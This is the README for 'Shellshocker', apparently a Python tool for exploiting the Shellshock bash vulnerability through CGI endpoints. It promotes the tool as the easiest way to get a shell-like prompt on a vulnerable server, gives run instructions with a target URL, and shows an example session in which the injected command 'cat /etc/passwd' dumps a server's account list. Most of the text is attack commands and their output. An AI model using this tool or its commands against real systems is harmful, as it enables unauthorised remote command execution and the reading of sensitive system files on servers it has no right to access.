# Shellshocker
Shellshock easily exploitation

When you find Shellshock / Bashbug vulnerability and want the easyest way to use it, you can use "Shellshocker".
Avoid tinkering with the user-agent and feels like a shell directly.

Using:
  1. Run the script with python
    "python shellshocker.py http://exam.com/cgi-bin/cat"

  2. Hit command and press enter:
    "cat /etc/passwd"

  3. Read the output :)

Example:

python shellshoker.py http://10.0.0.12:591/cgi-bin/cat

Shellshock Command: cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
saslauth:x:499:76:"Saslauthd user":/var/empty/saslauth:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
bynarr:x:500:501::/home/bynarr:/bin/bash
apache:x:48:48:Apache:/var/www:/sbin/nologin
apophis:x:501:502::/home/apophis:/bin/bash
